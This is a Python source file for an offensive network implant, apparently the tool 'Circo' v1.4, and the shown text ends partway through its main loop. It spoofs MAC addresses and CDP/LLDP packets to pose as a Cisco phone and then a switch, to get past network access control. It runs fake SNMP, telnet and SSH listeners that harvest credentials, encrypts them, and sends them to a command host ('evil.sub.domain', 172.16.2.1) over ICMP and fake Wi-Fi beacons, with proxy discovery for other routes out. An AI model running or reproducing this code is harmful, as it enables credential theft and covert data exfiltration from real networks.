#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import subprocess
import os
import signal
import re
import argparse
import sys
import time
import random
import threading
import unicodedata
import daemon
import ipcalc
import pyaes
import pyscrypt
import dns.resolver
import requests
# Remove Scapy IPv6 Warning
sys.stderr = None
# need Scapy >2.3.3 (CDP Checksum fix)
from scapy.all import *
# Revert back the STD output
sys.stderr = sys.__stderr__

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.4"

# Default options OFF
DEBUG = False
EAP = False
EPING = False
ETRACE = False
EDNS = False
EWEB = False
ESSL = False
EPRX = False

# Config
phrase = 'Waaaaa! awesome :)'
salt = 'salgruesa'
phonemac = '10:8C:CF:75:AA:AA'
switchmac = '00:8E:73:83:AA:BB'
switchport = 'FastEthernet0/3'
serial = 'FCW1831C1AA'
snpsu = 'LIT18300QBB'
snmpcommunity = 'public'
cchost = '172.16.2.1'
ccname = 'evil.sub.domain'
dirname = '/home/pi/circo/circo/'

# Perm files
motd = dirname + 'motd'
phonecdptpl = dirname + 'phonecdp-tpl.pcap'
swcdptpl = dirname + 'swcdp-tpl.pcap'
aptpl = dirname + 'ap-tpl.pcap'
snmptpl = dirname + 'Cisco_2960-tpl.snmpwalk'

# Temp files
snmpfake = dirname + 'Cisco_2960-fake.snmpwalk'
clifd = dirname + 'cli.conf'
agent = dirname + 'agent.csv'
mastercred = dirname + time.strftime(
             "%Y%m%d%H%M%S_CRED.txt", time.gmtime())


# Classes
class APHandler(threading.Thread):
    """
    Class to handle the Fake AP broadcasting SSID for extraction
    probe interval is 0.5 seconds per BSSID, adjust timer and inter if need it
    """
    def __init__(self, wiface, fd, timer):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.wiface = wiface
        self.fd = fd
        self.count = timer*2

    def run(self):
        while not self.stoprequest.isSet():
            if os.path.isfile(self.fd):
                # Load template beacon packet
                wifipkt = rdpcap(aptpl, 1)[0]
                # fake-ssid (need to match jaula_v1.py)
                SSIDroot = 'aterm-c17c02'
                # fake BSSID from NEC aterm routers
                add2 = '98:f1:99:c1:7c:02'
                wifipkt[Dot11].addr2 = add2
                wifipkt[Dot11].addr3 = add2
                with open(self.fd, 'r') as sfile:
                    for line in sfile:
                        if DEBUG:
                            print('Sending credentials via Fake-AP')
                        cry = encrypti(line.strip())
                        # split crypto len by 6
                        ar = [cry[i:i+6] for i in range(0, len(cry), 6)]
                        # padding
                        if len(ar) % 6 != 0:
                            for x in range(6-len(ar[len(ar)-1])):
                                ar[len(ar)-1] = ar[len(ar)-1] + '0'
                        # send first SSID (with out -g)
                        wifipkt[Dot11].SC = len(ar)
                        wifipkt[Dot11Beacon].beacon_interval = len(cry)
                        wifipkt[Dot11Elt].info = SSIDroot
                        wifipkt[Dot11Elt].len = len(SSIDroot)
                        # send the rest of SSID (with -g)
                        sendp(wifipkt, iface=self.wiface, inter=0.500,
                              count=self.count, verbose=0)
                        for x in range(len(ar)):
                            nadd2 = ('98:f1:99:' + ar[x][0:2] + ':' +
                                     ar[x][2:4] + ':' + ar[x][4:6])
                            wifipkt[Dot11].SC = x
                            wifipkt[Dot11].addr2 = nadd2
                            wifipkt[Dot11].addr3 = nadd2
                            wifipkt[Dot11Elt].info = 'aterm-' + ar[x] + '-g'
                            wifipkt[Dot11Elt].len = len(wifipkt[Dot11Elt].info)
                            sendp(wifipkt, iface=self.wiface, inter=0.500,
                                  count=self.count, verbose=0)
                        time.sleep(60)

    def join(self):
        self.stoprequest.set()


class CDPHandler(threading.Thread):
    """
    Class to handle CDP packets, will start in background and send
    packets every 60 seconds, pretend to be a Cisco Phone or Switch
    """
    def __init__(self, iface, pkt, mac, ip, name, port):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.cdppkt = pkt[0]
        self.mac = mac
        self.ip = ip
        self.name = name
        self.port = port

    def run(self):
        # Build Fake CDP packet using template (phone or switch)
        fakepkt = self.cdppkt
        ip = self.ip
        del fakepkt.cksum
        del fakepkt.len
        fakepkt[Dot3].src = self.mac
        fakepkt[CDPv2_HDR][CDPMsgAddr][CDPAddrRecordIPv4].addr = ip
        # Mgmt IP field used for switches (not phone)
        if 'Phone' not in fakepkt[CDPv2_HDR][CDPMsgPlatform].val:
            fakepkt[CDPv2_HDR][CDPMsgMgmtAddr][CDPAddrRecordIPv4].addr = ip
        fakepkt[CDPv2_HDR][CDPMsgDeviceID].val = self.name
        fakepkt[CDPv2_HDR][CDPMsgDeviceID].len = len(
                                            fakepkt[CDPv2_HDR][CDPMsgDeviceID])
        fakepkt[CDPv2_HDR][CDPMsgPortID].iface = self.port
        fakepkt[CDPv2_HDR][CDPMsgPortID].len = len(
                                            fakepkt[CDPv2_HDR][CDPMsgPortID])
        fakepkt.len = len(fakepkt[CDPv2_HDR]) + 8
        # re-calculate cksum
        fakepkt = fakepkt.__class__(str(fakepkt))

        while not self.stoprequest.isSet():
            sendp(fakepkt, verbose=0, iface=self.iface)
            time.sleep(60)

    def join(self):
        self.stoprequest.set()


class LLDPHandler(threading.Thread):
    """
    Class to handle LLDP packets, will start in background and send
    packets every 30 seconds, pretend to be a Cisco Phone or Switch
    """
    def __init__(self, iface, mac, ip, name, port, switch=True):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.mac = mac
        self.ip = ip
        self.name = name
        self.port = port
        self.switch = switch

    def run(self):
        pkteth = Ether()
        pkteth.dst = '01:80:c2:00:00:0e'
        pkteth.src = self.mac
        pkteth.type = 35020

        pktchass = LLDPDUChassisID()
        pktchass._type = 1
        pktchass.subtype = 4
        pktchass._length = 7
        pktchass.id = self.mac

        pktportid = LLDPDUPortID()
        pktportid._type = 2
        pktportid.subtype = 5
        pktportid.id = self.port[:2] + re.findall(r'[0-9/]+', self.port)[0]
        pktportid._length = len(pktportid[LLDPDUPortID].id) + 1

        pktttl = LLDPDUTimeToLive()
        pktttl._type = 3
        pktttl.ttl = 120
        pktttl._length = 2

        pktsys = LLDPDUSystemName()
        pktsys._type = 5
        pktsys.system_name = self.name
        pktsys._length = len(pktsys[LLDPDUSystemName].system_name)

        pktdes = LLDPDUSystemDescription()
        pktdes._type = 6

        if self.switch:
            pktdes.description = 'Cisco IOS Software, C2960 Software \
                (C2960-LANBASEK9-M), Version 15.0(2)SE, RELEASE SOFTWARE \
                (fc1)\nTechnical Support: http://www.cisco.com/techsupport\n\
                Copyright (c) 1986-2012 by Cisco Systems, Inc.\nCompiled \
                Sat 28-Jul-12 00:29 by prod_rel_team'
        else:
            pktdes.description = 'SIP75.8-5-3SR1S'

        pktdes._length = len(pktdes[LLDPDUSystemDescription].description)

        pktport = LLDPDUPortDescription()
        pktport._type = 4
        pktport.description = self.port
        pktport._length = len(pktport[LLDPDUPortDescription].description)

        pktsyscap = LLDPDUSystemCapabilities()
        pktsyscap._type = 7
        pktsyscap._length = 4
        pktsyscap.mac_bridge_available = 1
        pktsyscap.mac_bridge_enabled = 1

        pktmgt = LLDPDUManagementAddress()
        pktmgt._type = 8
        pktmgt._length = 12
        pktmgt.management_address = (chr(int(self.ip.split('.')[0]))
                                     + chr(int(self.ip.split('.')[1]))
                                     + chr(int(self.ip.split('.')[2]))
                                     + chr(int(self.ip.split('.')[3])))
        pktmgt._management_address_string_length = 5
        pktmgt.management_address_subtype = 1
        pktmgt.interface_numbering_subtype = 3
        pktmgt.interface_number = long(100)
        pktmgt._oid_string_length = 0
        pktmgt.object_id = ''

        pkt8021 = LLDPDUGenericOrganisationSpecific()
        pkt8021._type = 127
        pkt8021._length = 6
        pkt8021.org_code = 32962
        pkt8021.subtype = 1
        pkt8021.data = '\x00d'

        pkt8023 = LLDPDUGenericOrganisationSpecific()
        pkt8023._type = 127
        pkt8023._length = 9
        pkt8023.org_code = 4623
        pkt8023.subtype = 1
        pkt8023.data = '\x03l\x03\x00\x10'

        pktend = LLDPDUEndOfLLDPDU()
        pktend[LLDPDUEndOfLLDPDU]._type = 0
        pktend[LLDPDUEndOfLLDPDU]._length = 0

        pkt = pkteth / pktchass / pktportid / pktttl / pktsys / pktdes \
            / pktport / pktsyscap / pktmgt / pkt8021 / pkt8023 / pktend

        while not self.stoprequest.isSet():
            sendp(pkt, iface=self.iface, verbose=0)
            time.sleep(30)

    def join(self):
        self.stoprequest.set()


class SNMPHandler(threading.Thread):
    """
    Sniff for packets on UDP/161 and extract community into a file
    default community 'public' is not added as credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
        self.community = snmpcommunity

    def nonascii(self, s):
        return "".join(ch for ch in s if unicodedata.category(ch)[0] != "C")

    def pkt_callback(self, pkt):
        if pkt.haslayer(SNMP) and pkt[SNMP].community:
            comm = str(self.nonascii(str(pkt[SNMP].community).decode('utf_8')))
            if (comm != self.community) and not grep(self.fd, comm):
                srcip = strtohex(pkt[IP].src)
                with open(self.fd, 'a+') as sfile:
                    sfile.write('p,' + comm + ',' + srcip + '\n')
                    if DEBUG:
                        print('Found SNMP credentials')

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback,
                  filter="udp port 161", store=0, count=1)

    def join(self):
        self.stoprequest.set()


class DHCPHandler(threading.Thread):
    """
    Class for DHCP responses, parse it and return the details
    """
    def __init__(self, iface, hostname):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.hostname = hostname
        self.offer = 1
        self._rtn_ip = None
        self._rtn_mask = None
        self._rtn_gwip = None
        self._rtn_dns_srv = None
        self._rtn_domain = None
        self._rtn_pac = None

    def pkt_callbak(self, pkt):
        if DHCP in pkt:
            mtype = pkt[DHCP].options[0][1]
            ipaddr = pkt[BOOTP].yiaddr
            sip = pkt[BOOTP].siaddr
            mac = get_if_hwaddr(self.iface)
            if (mtype == 2) and (self.offer <= 1):
                self.offer = self.offer + 1
                for opt in pkt[DHCP].options:
                    if 'router' in opt:
                        gwip = opt[1]
                    if 'subnet_mask' in opt:
                        netmask = opt[1]
                    if 'domain' in opt:
                        domain = opt[1]
                    if (('name_server' in opt) or
                       ('domain-name-servers' in opt)):
                        dns_srv = opt[1]
                    if opt[0] == 252:
                        pac = opt[1]
                self._rtn_ip = ipaddr
                self._rtn_mask = netmask
                self._rtn_gwip = gwip
                self._rtn_dns_srv = dns_srv
                self._rtn_domain = domain
                self._rtn_pac = pac
                request = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                           IP(src="0.0.0.0", dst="255.255.255.255") /
                           UDP(sport=68, dport=67) /
                           BOOTP(chaddr=pkt[BOOTP].chaddr,
                                 xid=pkt[BOOTP].xid) /
                           DHCP(options=[('message-type', 'request'),
                                         ('server_id', sip),
                                         ('requested_addr', ipaddr),
                                         #('hostname', self.hostname),
                                         ('param_req_list', 0),
                                         ('end')
                                         ])
                           )
                sendp(request, iface=self.iface, verbose=0)
                self.join()

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callbak,
                  filter="udp and (port 68 or port 67)", store=0)

    def join(self):
        self.stoprequest.set()
        return self._rtn_ip, self._rtn_mask, self._rtn_gwip, self._rtn_dns_srv, self._rtn_domain, self._rtn_pac


class DHCPInformHandler(threading.Thread):
    """
    Class for DHCP Inform request to ask for Option 252
    """

    def __init__(self, iface, xid):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self._return = None
        self.xid = xid
        self.ack = 1

    def pkt_callback(self, pkt):
        if DHCP in pkt:
            mtype = pkt[DHCP].options[0][1]
            xid = pkt[BOOTP].xid
            if (mtype == 5) and (self.ack <= 1) and (xid == self.xid):
                self.ack = self.ack + 1
                for opt in pkt[DHCP].options:
                    if opt[0] == 252:
                        wpad = opt[1]
                        break
                self._return = wpad
                self.join()


    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback,
                  filter='udp and (port 68 or port 67)', store=0)

    def join(self):
        self.stoprequest.set()
        return self._return


# Functions
def grep(fd, pattern):
    if os.path.isfile(fd):
        with open(fd, "r") as sfile:
            lines = sfile.read().split()
            for x in range(len(lines)):
                if pattern in lines[x]:
                    return True
        return False
    else:
        return False

# IP Dotted format to hex for exfiltration
def strtohex(ip):
    return ''.join('{:02x}'.format(int(char)) for char in ip.split('.'))

# Look around for CDP/LLDP searching for device names
def discover(opciones):
    cli = open(clifd, 'w')
    cdpname = sniff(iface=opciones.nic,
                    filter='ether[20:2] == 0x2000', count=1, timeout=60)
    lldpname = sniff(iface=opciones.nic,
                     filter='ether proto 0x88cc', count=1, timeout=60)
    if cdpname:
        cli.write('<CDPNAME>,'
                  + cdpname[0][CDPv2_HDR][CDPMsgDeviceID].val.split('.')[0] + '\n')
        cli.write('<CDPINT>,'
                  + cdpname[0][CDPv2_HDR][CDPMsgPortID].iface + '\n')
        cli.write('<CDPMODEL>,'
                  + str(cdpname[0][CDPv2_HDR][CDPMsgPlatform].val).split()[1]
                  + '\n')
    if lldpname:
        cli.write('<LLDPNAME>,'
                  + lldpname[0][LLDPDU][LLDPDUSystemName].system_name.split('.')[0] + '\n')
        cli.write('<LLDPINT>,'
                  + lldpname[0][LLDPDU][LLDPDUPortDescription].description
                  + '\n')
    cli.close()

# Take interface down before MAC changing 
def changemac(iface, newmac):
    subprocess.call('ifconfig ' + iface + ' down >/dev/null', shell=True)
    subprocess.call('macchanger --mac=' + newmac + ' '
                    + iface + ' >/dev/null', shell=True)
    subprocess.call('ifconfig ' + iface + ' up >/dev/null', shell=True)


# Replace add route, resolve and setup IP (from DHCP)
def setip(iface, ip, mask, gw, dns_srv):
    FNULL = open(os.devnull, 'w')
    RESOLVE = open('/etc/resolv.conf', 'w')
    subprocess.call(["ifconfig", iface, ip, "netmask", mask],
                    stdout=FNULL, stderr=subprocess.STDOUT)
    subprocess.call(["route", "add", "default", "gw", gw],
                    stdout=FNULL, stderr=subprocess.STDOUT)
    subprocess.call(["echo", "nameserver", dns_srv],
                    stdout=RESOLVE, stderr=FNULL)
    RESOLVE.close()


# Generate fake switch name
def newname(cname):
    laststr = cname[-1:]
    if laststr.isdigit():
        total = int(laststr) + 2
        newswname = cname[:len(cname)-1] + str(total)
    else:
        newswname = cname + '01'
    return newswname


def kill_process(pstring):
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGKILL)


# Build SNMP OID Fake config
def snmpconf(swname, swip, swmask, swnet, swmac, gw, gwmac):
    gwmachex = gwmac.split(':')[0].upper() + ' '\
                + gwmac.split(':')[1].upper() + ' '\
                + gwmac.split(':')[2].upper() + ' '\
                + gwmac.split(':')[3].upper() + ' '\
                + gwmac.split(':')[4].upper() + ' '\
                + gwmac.split(':')[5].upper()
    hexip = "%0.2X" % int(swip.split('.')[0])\
            + " %0.2X" % int(swip.split('.')[1])\
            + " %0.2X" % int(swip.split('.')[2])\
            + " %0.2X" % int(swip.split('.')[3])\
            + ' 00 A1'
    machex = swmac.split(':')[0].upper() + ' '\
                + swmac.split(':')[1].upper() + ' '\
                + swmac.split(':')[2].upper() + ' '\
                + swmac.split(':')[3].upper() + ' '\
                + swmac.split(':')[4].upper() + ' '\
                + swmac.split(':')[5].upper()
    snmphex = []
    for i in range(len(snmpcommunity)):
        snmphex.append("%0.2X" % int(ord(snmpcommunity[i])))
    snmphex = ' '.join(snmphex)
    with open(snmptpl, 'r') as sfile:
        content = sfile.read()
        for repl in (('<NAME>', swname),
                     ('<IP>', swip),
                     ('<MASK>', swmask),
                     ('<NET>', swnet),
                     ('<MACHEX>', machex),
                     ('<GATEWAY>', gw),
                     ('<GWMAC>', gwmachex),
                     ('<SERIAL>', serial),
                     ('<SNPSU>', snpsu),
                     ('<SNMPHEX>', snmphex),
                     ('<IPHEX>', hexip)):
            content = content.replace(*repl)
    with open(snmpfake, 'w') as sfile:
        sfile.write(content)
    with open(agent, 'w') as sfile:
        sfile.write(snmpfake + ',' + swip + ',' + snmpcommunity + '\n')


# Connect to a potencial PAC URL and look for 'PROXY' lines, return a list
def getpac(ip, url):
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
            'Accept-Enconding': ', '.join(('gzip', 'deflate')),
            'Accept': '*/*',
            'Connection': 'keep-alive'
    }
    mm = set()
    if not url:
        pacurl = 'http://' + ip + '/'
    elif url == 'PAD':
        pacurl = 'http://' + ip + '/wpad.dat'
    else:
        pacurl = ip
    try:
        session = requests.get(pacurl, headers=headers)
        if session.status_code == 200:
            for x in range(len(session.content.split('\n'))):
                a = re.findall('PROXY ([0-9a-zA-Z.:-]+)', session.content.split('\n')[x])
                for m in range(len(a)):
                    if not re.search('127.0.0.1|localhost', a[m]):
                        mm.add(a[m])
        li = list(mm)
        li.sort()
        if li:
            return li
        else:
            return None
    except requests.exceptions.RequestException:
        return None


# AES crypto
def encrypti(cleartxt):
    hashed = pyscrypt.hash(phrase, salt, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    ciphertxt = aes.encrypt(cleartxt)
    return ciphertxt.encode('hex')


def parsingopt():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable debugging')
    parser.add_argument('-i', dest='nic', required=True, metavar='<eth0>',
                        default='eth0', help='Interface: eth0')
    parser.add_argument('-p', '--ping', action='store_true',
                        help='PING exfiltration')
    parser.add_argument('-t', '--trace', action='store_true',
                        help='Traceroute exfiltration')
    parser.add_argument('-d', '--dns', action='store_true',
                        help='DNS exfiltration')
    parser.add_argument('-w', '--web', action='store_true',
                        help='HTTP exfiltration')
    parser.add_argument('-s', '--ssl', action='store_true',
                        help='HTTPS exfiltration')
    parser.add_argument('-x', '--prx', action='store_true',
                        help='Proxy exfiltration')
    parser.add_argument('-a', dest='wnic', metavar='<wlan1>',
                        help='Wireles exfiltration')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        with open(motd, 'r') as sfile:
            print(sfile.read())
        print('Author: ' + __author__)
        print('Version: ' + __version__ + '\n')
        parser.print_help()
        sys.exit(1)


# Main Function

def main():
    global DEBUG
    global EAP
    global EPING
    global ETRACE
    global EDNS
    global EWEB
    global ESSL
    global EPRX
    opciones = parsingopt()
    if opciones.verbose:
        DEBUG = True
    if opciones.nic:
        iface = opciones.nic
    if opciones.wnic:
        wiface = opciones.wnic
        EAP = True
    if opciones.ping:
        EPING = True
    if opciones.trace:
        ETRACE = True
    if opciones.dns:
        EDNS = True
    if opciones.web:
        EWEB = True
    if opciones.ssl:
        ESSL = True
    if opciones.prx:
        EPRX = True

    # Load Scapy modules
    load_contrib("cdp")
    load_contrib("lldp")

    # Bring LAN interface up
    #subprocess.call('/sbin/ifconfig ' + iface + ' up', shell=True)

    # Change MAC, became a Cisco IP-Phone!
    if DEBUG:
        print('MAC change started - phone')
    changemac(iface, phonemac)
    if DEBUG:
        print('MAC change ended - phone')

    # Listen for CDP packets to get hostname from it
    if DEBUG:
        print('CDP/LLDP discover started')
    discover(opciones)
    if DEBUG:
        print('CDP/LLDP discover ended')

    # Grab an IP using DHCP
    if DEBUG:
        print('DHCP started')
    dh = DHCPHandler(iface, 'SEP' + phonemac.replace(':', ''))
    dh.daemon = True
    dh.start()
    time.sleep(0.5)
    mac = get_if_hwaddr(iface)
    chaddr = ''.join([chr(int(x, 16)) for x in mac.split(':')])
    xid = random.randint(0, 0xFFFF)
    dhcpdiscover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=chaddr, xid=xid) /
                    DHCP(options=[('message-type', 'discover'), 'end'])
                    )
    sendp(dhcpdiscover, iface=iface, verbose=0)
    time.sleep(10)
    ip, netmask, gwip, dns_srv, domain, wpad = dh.join()
    # need to add module for static ip in case DHCP doesn't work
    if DEBUG:
        print('DHCP ended')

    # Configure interface
    if DEBUG:
        print('Interface config started')
    setip(iface, ip, netmask, gwip, dns_srv)
    if DEBUG:
        print('Interface config ended')

    # Capture ARP responses
    if DEBUG:
        print('ARP gw started')

    # Send ARP WHO-HAS to grab MAC from default gateway
    query = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=ip, pdst=gwip)
    ans, a = srp(query, iface=iface, timeout=2, verbose=0)
    for a, rcv in ans:
        gwmac = rcv[Ether].src
        break

    if DEBUG:
        print('ARP gw ended')

    # Pretend to be a phone to bypass NAC, tune the amount of time you want
    cdppkt = rdpcap(phonecdptpl, 1)
    cdpdh = CDPHandler(iface, cdppkt, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1')
    cdpdh.daemon = True
    cdpdh.start()
    # Stop calling .join() after X seconds (default 60sec)
    if DEBUG:
        print('CDPd started - phone')
        time.sleep(10)
        print('CDPd stoped (60sec) - phone (verbose 10sec)')
    else:
        time.sleep(60)
    cdpdh.join()

    # Fake LLDP for phone
    lldpdh = LLDPHandler(iface, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1', False)
    lldpdh.daemon = True
    lldpdh.start()
    # Stop calling .join() after X seconds (default 60sec)
    if DEBUG:
        print('LLDP started - phone')
        time.sleep(10)
        print('LLDPd stoped (60sec) - phone (verbose 10sec)')
    else:
        time.sleep(60)
    lldpdh.join()

    if EPRX:
        prxlist = []
        if DEBUG:
            print('Proxy Discovery started')
        # Discover WPAD via DHCP Inform (Option 252) if not already via initial DHCP Reply
	if not wpad:
		dhinform = DHCPInformHandler(iface, xid)
		dhinform.daemon = True
		dhinform.start()
		dhcpinform = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
				IP(src=ip, dst="255.255.255.255") /
				UDP(sport=68, dport=67) /
				BOOTP(chaddr=chaddr, ciaddr=ip, xid=xid) /
				DHCP(options=[('message-type', 'inform'), ('param_req_list', 252), 'end'])
				)
		sendp(dhcpinform, iface=iface, verbose=0)
		time.sleep(10)
		wpad = dhinform.join()
        # No option 252, look for WPAD DNS entry
        if not wpad:
            if DEBUG:
                print('Looking for wpad.<domain> entry')
            resolver = dns.resolver.Resolver(configure=False)
            resolver.nameservers = [ dns_srv ]
            resolver.timeout = 1
            resolver.lifetime = 1
            try:
                answer = resolver.query('wpad.' + domain, 'A')
            except:
                answer = None
                pass
            if answer:
                if DEBUG:
                    print('Found WPAD DNS')
                    print(answer[0])
                prxlist = getpac(str(answer[0]), 'PAD')
        else:
            if DEBUG:
                print('Found DHCP option 252: {}'.format(wpad))
            prxlist = getpac(wpad, True)

        if not prxlist:
            # Build a list for DNS lookups (~280)
            if DEBUG:
                print('Guessing DNS entry for PAC server')
            # Combine below keywords together, _ and -
            tryname = [ 'proxy', 'pac', 'wpad', 'pad', 'internet', 'inet', 'gw', 'gateway', 'prx', 'web' ]
            master_list = []
            for x in range(len(tryname)):
                master_list.append(tryname[x])
                for z in range(len(tryname)):
                    if not tryname[x] == tryname[z]:
                        master_list.append(tryname[x] + tryname[z])
                        master_list.append(tryname[x] + '-' + tryname[z])
                        master_list.append(tryname[x] + '_' + tryname[z])

            resolver = dns.resolver.Resolver(configure=False)
            resolver.nameservers = [ dns_srv ]
            resolver.timeout = 1
            resolver.lifetime = 1
            for prx in range(len(master_list)):
                try:
                    answer = resolver.query(master_list[prx] + '.' + domain, 'A')
                except:
                    answer = False
                    pass
                if answer:
                    if DEBUG:
                        print('Found DNS, looking for PAC files')
                    for rr in range(len(answer)):
                        if DEBUG:
                            print(master_list[prx] + '.' + domain + '=' + answer[rr])
                        prxlist = getpac(str(answer[rr]), False)
                        if prxlist:
                            break
        if DEBUG:
            print('Proxy Discovery ended')

    # Wait 300sec or more to clear MAC (180sec to clear CDP)
    if DEBUG:
        time.sleep(10)
        print('Wait 300sec for MAC & CDP cache to clear (verbose 10sec)')
    else:
        time.sleep(300)

    # Change MAC to became a Cisco Switch
    if DEBUG:
        print('MAC change started - switch')
    changemac(iface, switchmac)
    if DEBUG:
        print('MAC change ended - switch')

    # Search CDP packets from discover()
    find = re.compile('[<CDPNAME>|<LLDPNAME>],(.*)')
    with open(clifd, 'r') as sfile:
        swname = find.findall(sfile.read())
    if swname:
        fakeswname = newname(swname[0])
    else:
        # make up a name if can't derive
        fakeswname = 'sw-test01'
    if DEBUG:
        print('Hostname setup - switch')

    # Start fake CDP as 'switch'
    cdppkt = rdpcap(swcdptpl, 1)
    cdpdh = CDPHandler(iface, cdppkt, switchmac, ip, fakeswname, switchport)
    cdpdh.daemon = True
    cdpdh.start()
    if DEBUG:
        print('CDPd started - switch')

    # Start fake LLDP as 'switch'
    lldpdh = LLDPHandler(iface, switchmac, ip, fakeswname, switchport, True)
    lldpdh.daemon = True
    lldpdh.start()
    if DEBUG:
        print('LLDP started - phone')

    # Create SNMP config for snmposter daemon
    ipnet = str(ipcalc.Network(ip + '/' + netmask).network())
    snmpconf(fakeswname, ip, netmask, ipnet, mac, gwip, gwmac)
    if DEBUG:
        print('SNMP config created')

    # Start snmposter daemon
    kill_process('snmposter')
    subprocess.call("/usr/local/bin/snmposter -f " + agent
                    + " 2>/dev/null", shell=True)
    snmpdh = SNMPHandler(iface, mastercred)
    snmpdh.daemon = True
    snmpdh.start()
    if DEBUG:
        print('SNMP catcher started')

    # Create config file for telnet & ssh fake daemons
    with open(clifd, 'a') as cli:
        cli.write('<NAME>,' + fakeswname + '\n')
        cli.write('<IP>,' + ip + '\n')
        cli.write('<MASK>,' + netmask + '\n')
        cli.write('<MASKCIDR>,' + str(sum([bin(int(x)).count("1")
                                      for x in netmask.split(".")])) + '\n')
        swcmac = switchmac.replace(':', '')
        swmaccisco = swcmac[0:4].lower() + '.' + swcmac[4:8].lower()\
            + '.' + swcmac[8:12].lower()
        cli.write('<MAC>,' + swmaccisco + '\n')
        cli.write('<INT>,' + switchport + '\n')
        cli.write('<NETIP>,' + ipnet + '\n')
        cli.write('<GWIP>,' + gwip + '\n')
        macraw = gwmac.replace(':', '')
        gwmaccisco = macraw[0:4] + '.' + macraw[4:8] + '.' + macraw[8:12]
        cli.write('<GWMAC>,' + gwmaccisco + '\n')
        cli.write('<SERIAL>,' + serial + '\n')
        cli.write('<SNPSU>,' + snpsu + '\n')
        # Future use in Circo v2
        cli.write('<SNMPC>,' + snmpcommunity + '\n')
    if DEBUG:
        print('CLI config created')

    # Kill telnet/ssh process if running and start them
    kill_process('telnetd-fake')
    if DEBUG:
        print('TELNET catcher started')
    telned = dirname + 'telnetd-fake.py'
    subprocess.call(telned + ' ' + mastercred + ' &', shell=True)
    if DEBUG:
        print('SSH catcher started')
    kill_process('sshd-fake')
    sshd = dirname + 'sshd-fake.py'
    subprocess.call(sshd + ' ' + mastercred + ' &', shell=True)

    # If Fake-AP exfiltration enable put wireless interface into monitor
    # Channel 10 (adjust as necessary to match jaula_v1.py)
    if EAP:
        if DEBUG:
            print('WIFI monitor started')
        subprocess.call('/sbin/ifconfig ' + wiface + ' down', shell=True)
        subprocess.call('/usr/sbin/airmon-ng start '
                        + wiface + ' 10 >/dev/null', shell=True)
        wiface = wiface + 'mon'
        subprocess.call('/sbin/ifconfig ' + wiface + ' up', shell=True)

        # Start Fake AP
        aphd = APHandler(wiface, mastercred, 5)
        aphd.daemon = True
        aphd.start()
        if DEBUG:
            print('AP started')

    # Main Loop if credentials found
    while True:
        try:
            if os.path.isfile(mastercred):
                with open(mastercred, 'r') as sfile:
                    for line in sfile:
                        # encrypt and split into 4 bytes
                        cry = encrypti(line.strip())
                        ar = [cry[i:i+4] for i in range(0, len(cry), 4)]
                        if len(cry) % 4 != 0:
                            for x in range(4-len(ar[len(ar)-1])):
                                ar[len(ar)-1] = ar[len(ar)-1] + '0'

                        # ICMP exfiltration
                        # Use [IP].id 200+len of crypto (first pkt)
                        # Then [IP].id 300+amount of pkts (split by 16bits)
                        # Send the crypto split by 16bits and replace
                        # [ICMP].seq field
                        if EPING:
                            if DEBUG:
                                print('Sending credentials via ICMP')
                            # craft packet
                            pingpkt = (Ether(src=switchmac, dst=gwmac) /
                                       IP(ihl=5, src=ip, dst=cchost)/ICMP() /
                                       Raw(load='s\x88\xb7[\x7f\xc2\x05\x00'
                                                '\x08\t\n\x0b\x0c\r\x0e\x0f'
                                                '\x10\x11\x12\x13\x14\x15\x16'
                                                '\x17\x18\x19\x1a\x1b\x1c\x1d'
                                                '\x1e\x1f !"#$%&\'()*+,-./012'
                                                '34567'))

                            # first pkt (crypto len)
                            pingpkt[IP].id = 200 + len(cry)
                            pingpkt[ICMP].seq = 1
                            pingpkt[ICMP].id = random.randint(0, 0xFFFF)
                            pingpkt = pingpkt.__class__(str(pingpkt))
                            sendp(pingpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # second pkt (amount of pkts)
                            del pingpkt[IP].chksum
                            del pingpkt[ICMP].chksum
                            pingpkt[IP].id = 300 + len(ar)
                            pingpkt[ICMP].seq = 2
                            pingpkt[ICMP].id = pingpkt[ICMP].id + 1
                            pingpkt = pingpkt.__class__(str(pingpkt))
                            sendp(pingpkt, iface=iface, verbose=0)

                            # random delay
                            if not DEBUG:
                                time.sleep(random.randint(1, 30))
                            else:
                                time.sleep(1)

                            # paylod pkts
                            for x in range(len(ar)):
                                del pingpkt[IP].chksum
                                del pingpkt[ICMP].chksum
                                pingpkt[IP].id = 500 + x
                                pingpkt[ICMP].seq = int(ar[x], 16)
                                pingpkt[ICMP].id = pingpkt[ICMP].id + 1
